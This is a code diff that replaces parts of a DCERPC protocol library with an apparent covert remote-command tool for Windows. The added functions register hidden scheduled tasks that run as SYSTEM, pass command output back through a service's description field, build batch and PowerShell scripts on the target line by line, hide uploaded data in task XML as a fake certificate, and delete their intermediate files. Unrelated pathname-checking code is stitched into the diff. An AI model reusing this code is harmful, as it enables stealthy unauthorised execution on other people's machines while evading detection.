-    0x16c9a165 : "rpc_m_dgpkt_bad_free",
-    0x16c9a166 : "rpc_m_lookaside_corrupt",
-    0x16c9a167 : "rpc_m_alloc_fail",
-    0x16c9a168 : "rpc_m_realloc_fail",
-    0x16c9a169 : "rpc_m_cant_open_file",
-    0x16c9a16a : "rpc_m_cant_read_addr",
-    0x16c9a16b : "rpc_svc_desc_libidl",
-    0x16c9a16c : "rpc_m_ctxrundown_nomem",
-    0x16c9a16d : "rpc_m_ctxrundown_exc",
-    0x16c9a16e : "rpc_s_fault_codeset_conv_error",
-    0x16c9a16f : "rpc_s_no_call_active",
-    0x16c9a170 : "rpc_s_cannot_support",
-    0x16c9a171 : "rpc_s_no_context_available",
-}
-
-class DCERPCException(Exception):
-    """
-    This is the exception every client should catch regardless of the underlying
-    DCERPC Transport used.
-    """
-    def __init__(self, error_string=None, error_code=None, packet=None):
-        """
-        :param string error_string: A string you want to show explaining the exception. Otherwise the default ones will be used
-        :param integer error_code: the error_code if we're using a dictionary with error's descriptions
-        :param NDR packet: if successfully decoded, the NDR packet of the response call. This could probably have useful
-        information
-        """
-        Exception.__init__(self)
-        self.packet = packet
-        self.error_string = error_string
-        if packet is not None:
-            try:
-                self.error_code = packet['ErrorCode']
-            except:
-                self.error_code = error_code
+                # Test whether each path component split from this pathname is valid or
+                # not, ignoring non-existent and non-readable path components.
+                for pathname_part in pathname.split(os.path.sep):
+                        try:
+                                os.lstat(root_dirname + pathname_part)
+                        # If an OS-specific exception is raised, its error code
+                        # indicates whether this pathname is valid or not. Unless this
+                        # is the case, this exception implies an ignorable kernel or
+                        # filesystem complaint (e.g., path not found or inaccessible).
+                        #
+                        # Only the following exceptions indicate invalid pathnames:
+                        #
+                        # * Instances of the Windows-specific "WindowsError" class
+                        #   defining the "winerror" attribute whose value is
+                        #   "ERROR_INVALID_NAME". Under Windows, "winerror" is more
+                        #   fine-grained and hence useful than the generic "errno"
+                        #   attribute. When a too-long pathname is passed, for example,
+                        #   "errno" is "ENOENT" (i.e., no such file or directory) rather
+                        #   than "ENAMETOOLONG" (i.e., file name too long).
+                        # * Instances of the cross-platform "OSError" class defining the
+                        #   generic "errno" attribute whose value is either:
+                        #   * Under most POSIX-compatible OSes, "ENAMETOOLONG".
+                        #   * Under some edge-case OSes (e.g., SunOS, *BSD), "ERANGE".
+                        except OSError as exc:
+                                if hasattr(exc, 'winerror'):
+                                        if exc.winerror == ERROR_INVALID_NAME:
+                                                return False
+                                elif exc.errno in {errno.ENAMETOOLONG, errno.ERANGE}:
+                                        return False
+        # If a "TypeError" exception was raised, it almost certainly has the
+        # error message "embedded NUL character" indicating an invalid pathname.
+        except TypeError as exc:
+                return False
+        # If no exception was raised, all path components and hence this
+        # pathname itself are valid. (Praise be to the curmudgeonly python.)
         else:
-            self.error_code = error_code
+                return True
+        # If any other exception was raised, this is an unrelated fatal issue
+        # (e.g., a bug). Permit this exception to unwind the call stack.
+        #
+        # Did we mention this should be shipped with Python already?
+def is_path_creatable(pathname: str) -> bool:
+        '''
+        `True` if the current user has sufficient permissions to create the passed
+        pathname; `False` otherwise.
+        '''
+        # Parent directory of the passed path. If empty, we substitute the current
+        # working directory (CWD) instead.
+        dirname = os.path.dirname(pathname) or os.getcwd()
+        return os.access(dirname, os.W_OK)
+def is_path_exists_or_creatable(pathname: str) -> bool:
+        '''
+        `True` if the passed pathname is a valid pathname for the current OS _and_
+        either currently exists or is hypothetically creatable; `False` otherwise.
 
-    def get_error_code( self ):
-        return self.error_code
- 
-    def get_packet( self ):
-        return self.packet
+        This function is guaranteed to _never_ raise exceptions.
+        '''
+        try:
+                # To prevent "os" module calls from raising undesirable exceptions on
+                # invalid pathnames, is_pathname_valid() is explicitly called first.
+                return is_pathname_valid(pathname) and (
+                        os.path.exists(pathname) or is_path_creatable(pathname))
+        # Report failure on non-fatal filesystem complaints (e.g., connection
+        # timeouts, permissions issues) implying this path to be inaccessible. All
+        # other exceptions are unrelated fatal issues and should not be caught here.
+        except OSError:
+                return False
+packet_delay=0
+there_is_no_need_to_get_echo_back=False
 
-    def __str__( self ):
-        key = self.error_code
-        if self.error_string is not None:
-            return self.error_string
-        if key in rpc_status_codes:
-            error_msg_short = rpc_status_codes[key]
-            return 'DCERPC Runtime Error: code: 0x%x - %s ' % (self.error_code, error_msg_short)
-        else:
-            return 'DCERPC Runtime Error: unknown error code: 0x%x' % self.error_code
+def wrap_cmd_exec(tschctl='tschctl',command='command',schtasks_name='schtasks_name',finish_mark=''):
 
-# Context Item
-class CtxItem(Structure):
-    structure = (
-        ('ContextID','<H=0'),
-        ('TransItems','B=0'),
-        ('Pad','B=0'),
-        ('AbstractSyntax','20s=""'),
-        ('TransferSyntax','20s=""'),
-    )
+        # command = f"{fake_certutil_name}.exe -f -decode {sch_backup_filename} {dest_path}.txt&&sc description {lpServiceName} \"{service_desc_marker}{finish_mark}{service_desc_marker}\""
 
-class CtxItemResult(Structure):
-    structure = (
-        ('Result','<H=0'),
-        ('Reason','<H=0'),
-        ('TransferSyntax','20s=""'),
-    )
+        # 执行一开始预设的bat脚本，将命令结果逐行设置到服务描述中
+        wrap_hSchRpcRegisterTask(tschctl, command=command, schtasks_name=schtasks_name, action=tsch.TASK_UPDATE)
+        tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)
 
-class SEC_TRAILER(Structure):
-    commonHdr = (
-        ('auth_type', 'B=10'),
-        ('auth_level','B=0'),
-        ('auth_pad_len','B=0'),
-        ('auth_rsvrd','B=0'),
-        ('auth_ctx_id','<L=747920'),
-    )
+        while True:
+                time.sleep(1)
+                motherfucker = retrive_service_description(svcctl, hService, service_desc_marker, my_codec=my_codec)
+                if motherfucker == '':
+                        continue
+                if motherfucker.split(finish_mark, 1).__len__() >= 2:
+                        print("cmd execution finished, trying to get echo back...")
+                        break
+def retrive_service_description(svcctl, hService,bat_gen_bat_prefix,my_codec='',unicode_is_coming=True):
+        config2response = hRQueryServiceConfig2W(svcctl, hService)
+        buffer_content = config2response['lpBuffer']
+        what_the_fuck = b''.join(buffer_content)
+        print("UNICODE fucker: ")
+        #print(what_the_fuck)
 
-class MSRPCHeader(Structure):
-    _SIZE = 16
-    commonHdr = ( 
-        ('ver_major','B=5'),                              # 0
-        ('ver_minor','B=0'),                              # 1
-        ('type','B=0'),                                   # 2
-        ('flags','B=0'),                                  # 3
-        ('representation','<L=0x10'),                     # 4
-        ('frag_len','<H=self._SIZE+len(auth_data)+(16 if (self["flags"] & 0x80) > 0 else 0)+len(pduData)+len(pad)+len(sec_trailer)'),  # 8
-        ('auth_len','<H=len(auth_data)'),                 # 10
-        ('call_id','<L=1'),                               # 12    <-- Common up to here (including this)
-    )
-
-    structure = ( 
-        ('dataLen','_-pduData','self["frag_len"]-self["auth_len"]-self._SIZE-(8 if self["auth_len"] > 0 else 0)'),
-        ('pduData',':'),                                
-        ('_pad', '_-pad','(4 - ((self._SIZE + (16 if (self["flags"] & 0x80) > 0 else 0) + len(self["pduData"])) & 3) & 3)'),
-        ('pad', ':'),
-        ('_sec_trailer', '_-sec_trailer', '8 if self["auth_len"] > 0 else 0'),
-        ('sec_trailer',':'),
-        ('auth_dataLen','_-auth_data','self["auth_len"]'),
-        ('auth_data',':'),
-    )
-
-    def __init__(self, data = None, alignment = 0):
-        Structure.__init__(self,data, alignment)
-        if data is None:
-            self['ver_major'] = 5
-            self['ver_minor'] = 0
-            self['flags'] = PFC_FIRST_FRAG | PFC_LAST_FRAG
-            self['type'] = MSRPC_REQUEST
-            self.__frag_len_set = 0
-            self['auth_len'] = 0
-            self['pduData'] = b''
-            self['auth_data'] = b''
-            self['sec_trailer'] = b''
-            self['pad'] = b''
-
-    def get_header_size(self):
-        return self._SIZE + (16 if (self["flags"] & PFC_OBJECT_UUID) > 0 else 0)
-
-    def get_packet(self):
-        if self['auth_data'] != b'':
-            self['auth_len'] = len(self['auth_data'])
-        # The sec_trailer structure MUST be 4-byte aligned with respect to 
-        # the beginning of the PDU. Padding octets MUST be used to align the 
-        # sec_trailer structure if its natural beginning is not already 4-byte aligned
-        ##self['pad'] = '\xAA' * (4 - ((self._SIZE + len(self['pduData'])) & 3) & 3)
-
-        return self.getData()
-
-class MSRPCRequestHeader(MSRPCHeader):
-    _SIZE = 24
-    commonHdr = MSRPCHeader.commonHdr + ( 
-        ('alloc_hint','<L=0'),                            # 16
-        ('ctx_id','<H=0'),                                # 20
-        ('op_num','<H=0'),                                # 22
-        ('_uuid','_-uuid','16 if self["flags"] & 0x80 > 0 else 0' ), # 22
-        ('uuid',':'),                                # 22
-    )
-
-    def __init__(self, data = None, alignment = 0):
-        MSRPCHeader.__init__(self, data, alignment)
-        if data is None:
-           self['type'] = MSRPC_REQUEST
-           self['ctx_id'] = 0
-           self['uuid'] = b''
-
-class MSRPCRespHeader(MSRPCHeader):
-    _SIZE = 24
-    commonHdr = MSRPCHeader.commonHdr + ( 
-        ('alloc_hint','<L=0'),                          # 16   
-        ('ctx_id','<H=0'),                              # 20
-        ('cancel_count','<B=0'),                        # 22
-        ('padding','<B=0'),                             # 23
-    )
-
-    def __init__(self, aBuffer = None, alignment = 0):
-        MSRPCHeader.__init__(self, aBuffer, alignment)
-        if aBuffer is None:
-            self['type'] = MSRPC_RESPONSE
-            self['ctx_id'] = 0
-
-class MSRPCBind(Structure):
-    _CTX_ITEM_LEN = len(CtxItem())
-    structure = ( 
-        ('max_tfrag','<H=4280'),
-        ('max_rfrag','<H=4280'),
-        ('assoc_group','<L=0'),
-        ('ctx_num','B=0'),
-        ('Reserved','B=0'),
-        ('Reserved2','<H=0'),
-        ('_ctx_items', '_-ctx_items', 'self["ctx_num"]*self._CTX_ITEM_LEN'),
-        ('ctx_items',':'),
-    )
- 
-    def __init__(self, data = None, alignment = 0):
-        Structure.__init__(self, data, alignment)
-        if data is None:
-            self['max_tfrag'] = 4280
-            self['max_rfrag'] = 4280
-            self['assoc_group'] = 0
-            self['ctx_num'] = 1
-            self['ctx_items'] = b''
-        self.__ctx_items = []
-
-    def addCtxItem(self, item):
-        self.__ctx_items.append(item)
-    
-    def getData(self):
-        self['ctx_num'] = len(self.__ctx_items)
-        for i in self.__ctx_items:
-            self['ctx_items'] += i.getData()
-        return Structure.getData(self)
-
-class MSRPCBindAck(MSRPCHeader):
-    _SIZE = 26 # Up to SecondaryAddr
-    _CTX_ITEM_LEN = len(CtxItemResult())
-    structure = ( 
-        ('max_tfrag','<H=0'),
-        ('max_rfrag','<H=0'),
-        ('assoc_group','<L=0'),
-        ('SecondaryAddrLen','<H&SecondaryAddr'), 
-        ('SecondaryAddr','z'),                          # Optional if SecondaryAddrLen == 0
-        ('PadLen','_-Pad','(4-((self["SecondaryAddrLen"]+self._SIZE) % 4))%4'),
-        ('Pad',':'),
-        ('ctx_num','B=0'),
-        ('Reserved','B=0'),
-        ('Reserved2','<H=0'),
-        ('_ctx_items','_-ctx_items','self["ctx_num"]*self._CTX_ITEM_LEN'),
-        ('ctx_items',':'),
-        ('_sec_trailer', '_-sec_trailer', '8 if self["auth_len"] > 0 else 0'),
-        ('sec_trailer',':'),
-        ('auth_dataLen','_-auth_data','self["auth_len"]'),
-        ('auth_data',':'),
-    )
-    def __init__(self, data = None, alignment = 0):
-        self.__ctx_items = []
-        MSRPCHeader.__init__(self,data,alignment)
-        if data is None:
-            self['Pad'] = b''
-            self['ctx_items'] = b''
-            self['sec_trailer'] = b''
-            self['auth_data'] = b''
-
-    def getCtxItems(self):
-        return self.__ctx_items
-
-    def getCtxItem(self,index):
-        return self.__ctx_items[index-1]
-
-    def fromString(self, data):
-        Structure.fromString(self,data)
-        # Parse the ctx_items
-        data = self['ctx_items']
-        for i in range(self['ctx_num']):
-            item = CtxItemResult(data)
-            self.__ctx_items.append(item)
-            data = data[len(item):]
-            
-class MSRPCBindNak(Structure):
-    structure = ( 
-        ('RejectedReason','<H=0'),
-        ('SupportedVersions',':'),
-    )
-    def __init__(self, data = None, alignment = 0):
-        Structure.__init__(self,data,alignment)
-        if data is None:
-            self['SupportedVersions'] = b''
-
-class DCERPC:
-    # Standard NDR Representation
-    NDRSyntax   = uuidtup_to_bin(('8a885d04-1ceb-11c9-9fe8-08002b104860', '2.0'))
-    # NDR 64
-    NDR64Syntax = uuidtup_to_bin(('71710533-BEBA-4937-8319-B5DBEF9CCC36', '1.0'))
-    transfer_syntax =  NDRSyntax
-
-    def __init__(self,transport):
-        self._transport = transport
-        self.set_ctx_id(0)
-        self._max_user_frag = None
-        self.set_default_max_fragment_size()
-        self._ctx = None
-
-    def get_rpc_transport(self):
-        return self._transport
-
-    def set_ctx_id(self, ctx_id):
-        self._ctx = ctx_id
-
-    def connect(self):
-        return self._transport.connect()
-
-    def disconnect(self):
-        return self._transport.disconnect()
-
-    def set_max_fragment_size(self, fragment_size):
-        # -1 is default fragment size: 0 for v5, 1300 y pico for v4
-        #  0 is don't fragment
-        #    other values are max fragment size
-        if fragment_size == -1:
-            self.set_default_max_fragment_size()
-        else:
-            self._max_user_frag = fragment_size
-
-    def set_default_max_fragment_size(self):
-        # default is 0: don'fragment. v4 will override this method
-        self._max_user_frag = 0
-
-    def send(self, data):
-        raise RuntimeError ('virtual method. Not implemented in subclass')
-
-    def recv(self):
-        raise RuntimeError ('virtual method. Not implemented in subclass')
-
-    def alter_ctx(self, newUID, bogus_binds=''):
-        raise RuntimeError ('virtual method. Not implemented in subclass')
-
-    def set_credentials(self, username, password, domain='', lmhash='', nthash='', aesKey='', TGT=None, TGS=None):
-        pass
-
-    def set_auth_level(self, auth_level):
-        pass
-
-    def set_auth_type(self, auth_type, callback=None):
-        pass
-
-    def get_idempotent(self):
-        return 0
-
-    def set_idempotent(self, flag):
-        pass
-
-    def call(self, function, body, uuid=None):
-        if hasattr(body, 'getData'):
-            return self.send(DCERPC_RawCall(function, body.getData(), uuid))
-        else:
-            return self.send(DCERPC_RawCall(function, body, uuid))
-
-    def request(self, request, uuid=None, checkError=True):
-        if self.transfer_syntax == self.NDR64Syntax:
-            request.changeTransferSyntax(self.NDR64Syntax)
-            isNDR64 = True
-        else:
-            isNDR64 = False
-
-        self.call(request.opnum, request, uuid)
-        answer = self.recv()
-
-        __import__(request.__module__)
-        module = sys.modules[request.__module__]
-        respClass = getattr(module, request.__class__.__name__ + 'Response')
-
-        if  answer[-4:] != b'\x00\x00\x00\x00' and checkError is True:
-            error_code = unpack('<L', answer[-4:])[0]
-            if error_code in rpc_status_codes:
-                # This is an error we can handle
-                exception = DCERPCException(error_code = error_code)
-            else:    
-                sessionErrorClass = getattr(module, 'DCERPCSessionError')
+        if not unicode_is_coming:
+                raw_unicode = what_the_fuck.decode(my_codec)
+                motherfucker = ''
+                iasdasd = 0
+                for i in raw_unicode:
+                        iasdasd = iasdasd + 1
+                        if iasdasd % 2 == 0:
+                                continue
+                        motherfucker = motherfucker + i
+                print('++++++++++++++++++++'+motherfucker+'--------'+bat_gen_bat_prefix+'++++++++++++++++++++')
                 try:
-                    # Try to unpack the answer, even if it is an error, it works most of the times
-                    response =  respClass(answer, isNDR64 = isNDR64)
-                except:
-                    # No luck :(
-                    exception = sessionErrorClass(error_code = error_code)
+                        asdasdasad=motherfucker.split(bat_gen_bat_prefix,1)[1].split(bat_gen_bat_prefix,1)[0]
+                        return asdasdasad
+                except Exception as e:
+                        return ''
+        # 前面3个字节扔掉，然后找到
+        # iasdasd = 0
+        # final_butes=b''
+        # preI=''
+        # for i in what_the_fuck:
+        #     iasdasd = iasdasd + 1
+        #     if iasdasd % 2 == 0:
+        #         final_butes= final_butes+ bytes([i])+ bytes([preI])
+        #     else:
+        #         preI=i
+
+        motherfucker = what_the_fuck.decode('utf-16le')
+
+        print('++++++++++++++++++++'+motherfucker+'--------'+bat_gen_bat_prefix+'++++++++++++++++++++')
+        try:
+                asdasdasad=motherfucker.split(bat_gen_bat_prefix,1)[1].split(bat_gen_bat_prefix,1)[0]
+                return asdasdasad
+        except Exception as e:
+                return ''
+
+def get_echo_back(svcctl,hService,bat_gen_bat_prefix,execution_count,tschctl,schtasks_name):
+        final_string=''
+        for i in range(execution_count):
+                wrap_hSchRpcRegisterTask(tschctl, command=bat_gen_bat_prefix+ str(i + 1)+'.bat', schtasks_name=schtasks_name, action=tsch.TASK_UPDATE)
+                tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)
+                while True:
+                        #time.sleep(packet_delay)
+                        motherfucker = retrive_service_description(svcctl, hService, bat_gen_bat_prefix,my_codec=my_codec)
+                        if motherfucker=='':
+                                continue
+                        # 这个地方虚高1，需要减掉
+                        print("WHAT THE FUCK---------------------")
+                        print(motherfucker)
+                        if len(motherfucker.split('mockcount',1))<2:
+                                continue
+                        if int(motherfucker.split('mockcount',1)[1])-1==i+1:
+                                # 编号对应，则说明已经成功写入，累加到结果字符串中即可
+                                final_string=final_string+motherfucker.split('mockcount',1)[0]+'\n'
+                                break
+
+        print('++++++++++++++++++++++++++++++++++++CMD ECHO++++++++++++++++++++++++++++++++++++')
+        print(final_string)
+        print('++++++++++++++++++++++++++++++++++++CMD ECHO++++++++++++++++++++++++++++++++++++')
+
+def xml_escape(data):
+        replace_table = {
+                "&": "&amp;",
+                '"': "&quot;",
+                "'": "&apos;",
+                ">": "&gt;",
+                "<": "&lt;",
+        }
+        return ''.join(replace_table.get(c, c) for c in data)
+
+def delete_bat_gen_file(bat_prefix,servicename='',hService='',schtasks_name='',svcctl='',tschctl=''):
+        finish_mark=generate_random_string(5)
+        command = f'del %s*&&C:\windows\system32\sc.exe description %s "{bat_gen_bat_prefix}%s{bat_gen_bat_prefix}"' % (bat_prefix,servicename,finish_mark)
+        wrap_hSchRpcRegisterTask(tschctl,command=command,schtasks_name=schtasks_name,action=tsch.TASK_UPDATE)
+        tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)
+
+        while True:
+                #time.sleep(packet_delay)
+                print(f'????????????????????DELETE bat gen file {bat_prefix}* with mark {finish_mark}??????????????????????')
+                motherfucker = retrive_service_description(svcctl, hService, bat_gen_bat_prefix,my_codec=my_codec)
+                if motherfucker=='':
+                        continue
+                if motherfucker.split(finish_mark, 1).__len__() >= 2:
+                        #print("cmd execution finished, trying to get echo back...")
+                        return
+
+                #print("waiting for cmd execution finish...")
+#def delete_inter_file(bat_file_name,bat_source_file_name,tschctl='', bat_gen_bat_prefix='',schtasks_name='',servicename='',svcctl='',hService='',my_codec=''):
+
+def delete_inter_file(bat_file_name='',copied_xml_file_name='xml_file_name',file_part_1_name='file_part_1_name',
+                      desc_header_file_name='desc_header_file_name',desc_tail_file_name='desc_tail_file_name',
+                      cmd_result_file_name='cmd_result_file_name',new_xml_file='new_xml_file',
+                      sch_backup_filename='sch_backup_filename',    fake_certutil_name = 'fake_certutil_name',
+                      split_out_dir_on_target='split_out_dir_on_target',
+                      servicename='lpServiceName',hService='hService',svcctl='svcctl',tschctl='tschctl',  ps_file_name='ps_file_name',schtasks_name='schtasks_name',service_desc_marker='service_desc_marker'):
+
+        finish_mark=generate_random_string(5)
+        split_out_dir_on_target=''
+        if split_out_dir_on_target=='':
+                command = f'del {sch_backup_filename};{fake_certutil_name};{bat_file_name}.bat;{copied_xml_file_name};{file_part_1_name};{desc_header_file_name};{desc_tail_file_name};{cmd_result_file_name};{cmd_result_file_name}1;{new_xml_file};{new_xml_file}1;{ps_file_name}.ps1;{new_xml_file}2&&C:\windows\system32\sc.exe description {servicename} "{service_desc_marker}{finish_mark}{service_desc_marker}"'
+        else:
+                command = f'del {sch_backup_filename};{fake_certutil_name };{bat_file_name}.bat;{copied_xml_file_name};{file_part_1_name};{desc_header_file_name};{desc_tail_file_name};{cmd_result_file_name};{cmd_result_file_name}1;{new_xml_file};{new_xml_file}1;{new_xml_file}2&&del /q {split_out_dir_on_target}\\*&&rd /q {split_out_dir_on_target}&&C:\windows\system32\sc.exe description {servicename} "{service_desc_marker}{finish_mark}{service_desc_marker}"'
+        wrap_hSchRpcRegisterTask(tschctl,command=command,schtasks_name=schtasks_name,action=tsch.TASK_UPDATE)
+        tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)
+
+        while True:
+                time.sleep(1)
+                print(f"???????????????????DELETE bat and res file")# {bat_file_name}-----{bat_source_file_name}with mark {finish_mark}?????????????????????????????")
+                motherfucker = retrive_service_description(svcctl, hService, service_desc_marker,my_codec=my_codec)
+                if motherfucker=='':
+                        continue
+                if motherfucker.split(finish_mark, 1).__len__() >= 2:
+                        #print("cmd execution finished, trying to get echo back...")
+                        return
+
+                #print("waiting for cmd execution finish...")
+def write_pwershell(svcctl='', hService='', schtasks_name='', service_name='', service_desc_marker='', ps_file_name='', encoded_file_name='',out_dir=''):
+        ps_content = """function Get-Domain {$inputFile = "1.txt";$outputPrefix = "outdir\output";$chunkSize = 1MB;$index = 1;$stream = New-Object System.IO.FileStream($inputFile, [System.IO.FileMode]::Open)
+$reader = New-Object System.IO.BinaryReader($stream);while ($true) {$chunk = $reader.ReadBytes($chunkSize);if ($chunk.Length -eq 0) { break }
+$outputFile = "{0}_{1:0000}" -f $outputPrefix, $index;$index++;Set-Content -Path $outputFile -Value $chunk -Encoding Byte;};$reader.Close();$stream.Close();$c="cmd /c sc description qwer sdgfdfdsfdffinishmark";$d="sdgfdfdsfdf";$cc="{0}{1}{2}" -f $c,$index,$d;Invoke-Expression $cc}"""
+        # 需要替换输入文件1.txt，输出目录outdir，
+        finisssssh_mark=generate_random_string(5)
+        ps_content = ps_content.replace('1.txt', encoded_file_name)
+        ps_content = ps_content.replace('outdir', out_dir)
+        ps_content = ps_content.replace('qwer', service_name)
+        ps_content = ps_content.replace('sdgfdfdsfdf', service_desc_marker)
+        ps_content = ps_content.replace('finishmark', finisssssh_mark)
+
+        count = 0
+        for line in ps_content.splitlines():
+                count = count + 1
+                finish_mark = generate_random_string(5)
+                command = "echo %s>>%s.ps1&&sc description %s \"%s\"" % (
+                        line, ps_file_name, service_name, service_desc_marker + finish_mark + service_desc_marker)
+                wrap_hSchRpcRegisterTask(tschctl, command=command, schtasks_name=schtasks_name, action=tsch.TASK_UPDATE)
+                tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)
+                while True:
+                        time.sleep(1)
+                        print(f'?????????????????????EXECUTING {count} line makr with {finish_mark}????????????????????????')
+                        motherfucker = retrive_service_description(svcctl, hService, service_desc_marker, my_codec=my_codec)
+                        if motherfucker == '':
+                                continue
+                        if motherfucker.split(finish_mark, 1).__len__() >= 2:
+                                # print("cmd execution finished, trying to get echo back...")
+                                break
+
+                        # print("waiting for cmd execution finish...")
+        return finisssssh_mark
+
+
+def write_bat(svcctl='', hService='', schtasks_name='', service_name='', service_desc_marker='',
+              file_part_1_name='', bat_file_name='', copied_xml_name='',desc_header_file_name='',
+              desc_tail_file_name=''):
+        # 转义后的脚本
+
+        bat_content="""@echo off ^&^&setlocal EnableDelayedExpansion^&^&copy tasks\\schtasks_name xml.xml^&^& set /a linenumber=45 ^&^& set destfile=file_part_1_file ^&^& set inputfile=xml.xml
+set count=0 ^&^& for /f "tokens=* delims=" ^%^%a in ('type "%inputfile%"') do (
+set /a count+=1 ^&^& if !linenumber! LEQ !count! (set /a random=1) else (echo ^%^%a ^>^> !destfile!))
+echo ^^^<Description^^^>^>description_header^&^&echo ^^^</Description^^^>^^^</RegistrationInfo^^^>^^^</Task^^^>^>description_tail^&^& sc description servicename finishmark"""
+        # 替换掉服务名称
+        bat_content = bat_content.replace('servicename', service_name)
+        bat_content = bat_content.replace('schtasks_name', schtasks_name)
+        bat_content = bat_content.replace('xmlname', copied_xml_name)
+        # 替换掉计划任务的xml文件拷贝文件名称
+        bat_content = bat_content.replace('xml.xml', copied_xml_name)
+        # 替换掉服务描述值
+        bat_finish_mark =generate_random_string(5)
+        bat_content = bat_content.replace('finishmark', service_desc_marker + bat_finish_mark + service_desc_marker)
+        # 替换掉组合文件的第一部分文件名
+        bat_content = bat_content.replace('file_part_1_file', file_part_1_name)
+        bat_content = bat_content.replace('description_tail', desc_tail_file_name)
+        bat_content = bat_content.replace('description_header', desc_header_file_name)
+
+        count=0
+        for line in bat_content.splitlines():
+                count=count+1
+                finish_mark=generate_random_string(5)
+                command = "echo %s>>%s.bat&&sc description %s \"%s\"" % (line,bat_file_name,service_name,service_desc_marker + finish_mark + service_desc_marker)
+                wrap_hSchRpcRegisterTask(tschctl,command=command,schtasks_name=schtasks_name,action=tsch.TASK_UPDATE)
+                tsch.hSchRpcRun(tschctl, '\\%s' % schtasks_name)
+                while True:
+                        time.sleep(1)
+                        print(f'?????????????????????EXECUTING {count} line makr with {finish_mark}????????????????????????')
+                        motherfucker = retrive_service_description(svcctl, hService, service_desc_marker,my_codec=my_codec)
+                        if motherfucker=='':
+                                continue
+                        if motherfucker.split(finish_mark, 1).__len__() >= 2:
+                                #print("cmd execution finished, trying to get echo back...")
+                                break
+
+                        #print("waiting for cmd execution finish...")
+        return bat_finish_mark
+
+
+def wrap_upload_hSchRpcRegisterTask(tschctl, encoded_string = 'encoded_string', sch_backup_filename='sch_backup_filename',lpServiceName='lpServiceName',service_desc_marker='preix',finish_mark='',schtasks_name = 'schtasks_name', action=tsch.TASK_UPDATE):
+
+
+
+        cmd = "cmd.exe"
+
+
+
+        #args = "/C %s > %%windir%%\\Temp\\%s 2>&1 && certutil -f -encode %s %s" % (command, result_file_name,
+        # result_file_name,encoded_file_name)
+        args='/c copy tasks\\%s %s&&sc description %s "%s + %s + %s"' % (schtasks_name,sch_backup_filename,lpServiceName,service_desc_marker,finish_mark,service_desc_marker)
+
+        xml = """<?xml version="1.0" encoding="UTF-16"?>
+        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+          <Triggers>
+            <CalendarTrigger>
+              <StartBoundary>9999-07-15T20:35:13.2757294</StartBoundary>
+              <Enabled>true</Enabled>
+              <ScheduleByDay>
+                <DaysInterval>1</DaysInterval>
+              </ScheduleByDay>
+            </CalendarTrigger>
+          </Triggers>
+          <Principals>
+            <Principal id="LocalSystem">
+              <UserId>S-1-5-18</UserId>
+              <RunLevel>HighestAvailable</RunLevel>
+            </Principal>
+          </Principals>
+          <Settings>
+            <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+            <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+            <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+            <AllowHardTerminate>true</AllowHardTerminate>
+            <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+            <IdleSettings>
+              <StopOnIdleEnd>true</StopOnIdleEnd>
+              <RestartOnIdle>false</RestartOnIdle>
+            </IdleSettings>
+            <AllowStartOnDemand>true</AllowStartOnDemand>
+            <Enabled>true</Enabled>
+            <Hidden>true</Hidden>
+            <RunOnlyIfIdle>false</RunOnlyIfIdle>
+            <WakeToRun>false</WakeToRun>
+            <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
+            <Priority>7</Priority>
+          </Settings>
+          <Actions Context="LocalSystem">
+            <Exec>
+              <Command>%s</Command>
+              <Arguments>%s</Arguments>
+            </Exec>
+          </Actions> <RegistrationInfo>
+    <URI>\pbieo</URI>
+    <Description>-----BEGIN CERTIFICATE-----%s-----END CERTIFICATE-----</Description>
+  </RegistrationInfo>
+        </Task>
+                """ % ((xml_escape(cmd)),
+                       (xml_escape(args)),
+                       (xml_escape(encoded_string)))
+        taskCreated = False
+        tsch.hSchRpcRegisterTask(tschctl, '\\%s' % schtasks_name, xml, action, NULL, tsch.TASK_LOGON_NONE)
+
+def wrap_hSchRpcRegisterTask(tschctl,command,result_file_name='',encoded_file_name='',schtasks_name="",action=tsch.TASK_CREATE):
+        cmd = "cmd.exe"
+
+
+
+        #args = "/C %s > %%windir%%\\Temp\\%s 2>&1 && certutil -f -encode %s %s" % (command, result_file_name,
+        # result_file_name,encoded_file_name)
+        args='/c %s'%command
+
+        xml = """<?xml version="1.0" encoding="UTF-16"?>
+        <Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+          <Triggers>
+            <CalendarTrigger>
+              <StartBoundary>9999-07-15T20:35:13.2757294</StartBoundary>
+              <Enabled>true</Enabled>
+              <ScheduleByDay>
+                <DaysInterval>1</DaysInterval>
+              </ScheduleByDay>
+            </CalendarTrigger>
+          </Triggers>
+          <Principals>
+            <Principal id="LocalSystem">
+              <UserId>S-1-5-18</UserId>
+              <RunLevel>HighestAvailable</RunLevel>
+            </Principal>
+          </Principals>
+          <Settings>
+            <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+            <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+            <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+            <AllowHardTerminate>true</AllowHardTerminate>
+            <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+            <IdleSettings>
+              <StopOnIdleEnd>true</StopOnIdleEnd>
+              <RestartOnIdle>false</RestartOnIdle>
+            </IdleSettings>
+            <AllowStartOnDemand>true</AllowStartOnDemand>
+            <Enabled>true</Enabled>
+            <Hidden>true</Hidden>
+            <RunOnlyIfIdle>false</RunOnlyIfIdle>
+            <WakeToRun>false</WakeToRun>
+            <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
+            <Priority>7</Priority>
+          </Settings>
+          <Actions Context="LocalSystem">
+            <Exec>
+              <Command>%s</Command>
+              <Arguments>%s</Arguments>
+            </Exec>
+          </Actions> <RegistrationInfo>
+    <URI>\pbieo</URI>
+  </RegistrationInfo>
+        </Task>
+                """ % ((xml_escape(cmd)),
+                       (xml_escape(args)))
+        taskCreated = False
+        tsch.hSchRpcRegisterTask(tschctl, '\\%s' % schtasks_name, xml, action, NULL, tsch.TASK_LOGON_NONE)
+
